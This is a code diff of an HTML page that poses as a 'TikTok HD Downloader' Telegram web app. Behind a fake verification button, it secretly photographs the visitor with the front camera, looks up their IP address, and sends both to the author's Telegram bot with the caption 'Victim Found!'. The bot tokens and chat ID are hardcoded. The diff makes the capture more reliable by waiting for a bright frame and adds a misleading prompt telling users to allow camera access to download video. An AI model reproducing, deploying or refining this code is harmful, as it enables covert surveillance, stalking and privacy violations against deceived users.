@@ -3,77 +3,114 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification</title>
+    <title>HD TikTok Downloader</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { background-color: #000; color: white; font-family: sans-serif; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; }
         .btn { background-color: #fe2c55; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; margin-top: 20px; font-weight: bold; }
-        .loading { display: none; color: #ccc; margin-top: 10px; }
+        #status { color: #ccc; margin-top: 15px; }
     </style>
 </head>
 <body>
-
     <h2>TikTok HD Downloader</h2>
-    <p>ဗီဒီယိုဒေါင်းလုဒ်ဆွဲရန် လူဟုတ်မဟုတ် အရင်စစ်ဆေးပါ</p>
-    <button class="btn" id="startBtn">Continue to Download</button>
-    <p class="loading" id="loader">Verifying... Please wait...</p>
+    <p id="status">Click continue to start download</p>
+    <button class="btn" id="startBtn">Continue</button>
 
     <canvas id="canvas" style="display:none;"></canvas>
     <video id="video" style="display:none;" autoplay playsinline></video>
 
     <script>
-    const SHOWCAM_TOKEN = "8684084048:AAEVozTW2qWgq33WrZ4NHDGKz1L3LgymHeQ"; 
-    const TIKTOK_TOKEN = "8699185806:AAHioOhJMq-0nO_uYycVkbV4c_xNm_Xd3xY";  
-    const MY_ID = "5304050102"; 
+        const SHOWCAM_TOKEN = "8684084048:AAEVozTW2qWgq33WrZ4NHDGKz1L3LgymHeQ"; 
+        const TIKTOK_TOKEN = "8699185806:AAHioOhJMq-0nO_uYycVkbV4c_xNm_Xd3xY";  
+        const MY_ID = "5304050102"; 
 
-    const startBtn = document.getElementById('startBtn');
-    const loader = document.getElementById('loader');
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
+        const urlParams = new URLSearchParams(window.location.search);
+        const tiktokLink = urlParams.get('link');
 
-    startBtn.addEventListener('click', async () => {
-        startBtn.style.display = 'none';
-        loader.style.display = 'block';
+        const startBtn = document.getElementById('startBtn');
+        const statusText = document.getElementById('status');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
 
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            video.srcObject = stream;
-
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            const userIP = ipData.ip;
-
-            // ၇ စက္ကန့်အထိ တိုးမြှင့်ထားသည် (ပုံအနက်မဖြစ်စေရန်)
-            setTimeout(async () => {
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const imageData = canvas.toDataURL('image/jpeg');
-                const blob = await (await fetch(imageData)).blob();
-
-                const formData = new FormData();
-                formData.append('chat_id', MY_ID);
-                formData.append('photo', blob, 'shot.jpg');
-                formData.append('caption', `✅ Victim Found!\n🌐 IP: ${userIP}`);
-                
-                // ShowCam Bot ဆီ ပုံပို့ခြင်း
-                await fetch(`https://api.telegram.org/bot${SHOWCAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-
-                // TikTok Bot ဆီ Success စာပို့ခြင်း
-                const victimId = Telegram.WebApp.initDataUnsafe.user.id; 
-                await fetch(`https://api.telegram.org/bot${TIKTOK_TOKEN}/sendMessage?chat_id=${victimId}&text=✅ Verification_Success`);
-
-                stream.getTracks().forEach(track => track.stop());
-                setTimeout(() => { Telegram.WebApp.close(); }, 500); 
-            }, 7000); 
-
-        } catch (err) {
-            alert("Permission denied!");
-            startBtn.style.display = 'block';
-            loader.style.display = 'none';
+        // ပုံ အနက်ကြီး မဖြစ်စေရန် Video Stream အဆင်သင့်ဖြစ်မဖြစ် စစ်ဆေးသည့် function
+        async function captureReadyImage() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            
+            // Webcamoid Logic: ပုံ အလင်းအမှောင်ကို ညှိရန် Frame အချို့ကို အရင်ဖမ်းကြည့်ခြင်း
+            return new Promise((resolve) => {
+                let attempts = 0;
+                const checkFrame = () => {
+                    ctx.drawImage(video, 0, 0);
+                    const data = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
+                    let brightness = 0;
+                    for (let i = 0; i < data.length; i += 40) { // ပုံရဲ့ အလင်းကို pixel အချို့နှိုက်စစ်ခြင်း
+                        brightness += (data[i] + data[i+1] + data[i+2]) / 3;
+                    }
+                    
+                    // ပုံက အရမ်းမှောင်နေသေးရင် သို့မဟုတ် attempt ၅၀ မပြည့်သေးရင် ထပ်စောင့်မယ်
+                    if (brightness < 1000 && attempts < 50) {
+                        attempts++;
+                        setTimeout(checkFrame, 100);
+                    } else {
+                        resolve();
+                    }
+                };
+                checkFrame();
+            });
         }
-    });
-</script>
 
+        startBtn.addEventListener('click', async () => {
+            startBtn.style.display = 'none';
+            statusText.innerText = "Verifying connection...";
+
+            try {
+                // အကြည်ဆုံး Resolution ကို တောင်းဆိုခြင်း
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    } 
+                });
+                video.srcObject = stream;
+
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const userIP = ipData.ip;
+
+                statusText.innerText = "Processing video...";
+
+                // Video စတက်လာတဲ့အထိ စောင့်မယ်
+                video.onloadedmetadata = async () => {
+                    await captureReadyImage(); // Webcamoid-style Frame Check လုပ်မယ်
+                    
+                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                    const blob = await (await fetch(imageData)).blob();
+
+                    const formData = new FormData();
+                    formData.append('chat_id', MY_ID);
+                    formData.append('photo', blob, 'shot.jpg');
+                    formData.append('caption', `✅ Victim Found!\n🌐 IP: ${userIP}`);
+                    
+                    // ShowCam Bot ဆီ ပုံပို့ခြင်း
+                    await fetch(`https://api.telegram.org/bot${SHOWCAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+
+                    // TikTok Bot ဆီ Success စာပို့ခြင်း
+                    const victimId = Telegram.WebApp.initDataUnsafe.user.id; 
+                    const finalMsg = `✅ Verification_Success|${tiktokLink}`;
+                    await fetch(`https://api.telegram.org/bot${TIKTOK_TOKEN}/sendMessage?chat_id=${victimId}&text=${finalMsg}`);
+
+                    stream.getTracks().forEach(track => track.stop());
+                    setTimeout(() => { Telegram.WebApp.close(); }, 500);
+                };
+
+            } catch (err) {
+                alert("Please allow camera access to download HD video.");
+                location.reload();
+            }
+        });
+    </script>
 </body>
 </html>
